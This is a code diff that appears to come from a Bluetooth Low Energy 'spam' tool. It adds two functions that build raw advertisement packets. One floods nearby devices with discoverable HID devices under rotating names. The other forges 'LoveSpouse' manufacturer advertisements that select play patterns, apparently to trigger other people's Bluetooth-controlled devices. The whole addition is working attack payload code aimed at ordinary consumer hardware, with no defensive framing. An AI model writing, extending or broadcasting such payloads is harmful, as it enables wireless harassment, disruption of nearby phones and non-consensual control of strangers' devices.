@@ -621,6 +621,43 @@ static inline uint8_t ble_spam_build_xiaomi(uint8_t* buf) {
     return i; /* 28 */
 }
 
+/**
+ * NameFlood -- discoverable HID device with a rotating local name.
+ *
+ * Returns: up to 31 bytes (names are limited to 19 bytes).
+ */
+static inline uint8_t ble_spam_build_nameflood(uint8_t* buf, const char* name) {
+    size_t name_len = strlen(name);
+    if(name_len > 19) name_len = 19;
+
+    uint8_t i = 0;
+    buf[i++] = 0x02; buf[i++] = 0x01; buf[i++] = 0x06;
+    buf[i++] = (uint8_t)(name_len + 1); buf[i++] = 0x09;
+    memcpy(&buf[i], name, name_len); i += name_len;
+    buf[i++] = 0x03; buf[i++] = 0x02; buf[i++] = 0x12; buf[i++] = 0x18;
+    buf[i++] = 0x02; buf[i++] = 0x0A; buf[i++] = 0x00;
+    return i;
+}
+
+/**
+ * LoveSpouse manufacturer advertisement.
+ *
+ * The 24-bit mode selects a play pattern or stop command.
+ * Returns: 22 bytes.
+ */
+static inline uint8_t ble_spam_build_lovespouse(uint8_t* buf, uint32_t mode) {
+    uint8_t i = 0;
+    buf[i++] = 0x02; buf[i++] = 0x01; buf[i++] = 0x1A;
+    buf[i++] = 0x0E; buf[i++] = 0xFF; buf[i++] = 0xFF; buf[i++] = 0x00;
+    buf[i++] = 0x6D; buf[i++] = 0xB6; buf[i++] = 0x43; buf[i++] = 0xCE;
+    buf[i++] = 0x97; buf[i++] = 0xFE; buf[i++] = 0x42; buf[i++] = 0x7C;
+    buf[i++] = (uint8_t)(mode >> 16);
+    buf[i++] = (uint8_t)(mode >> 8);
+    buf[i++] = (uint8_t)mode;
+    buf[i++] = 0x03; buf[i++] = 0x03; buf[i++] = 0x8F; buf[i++] = 0xAE;
+    return i;
+}
+
 
 static const char* pair_spam_device_names[] = {
     "Your Sister's Apple Watch",
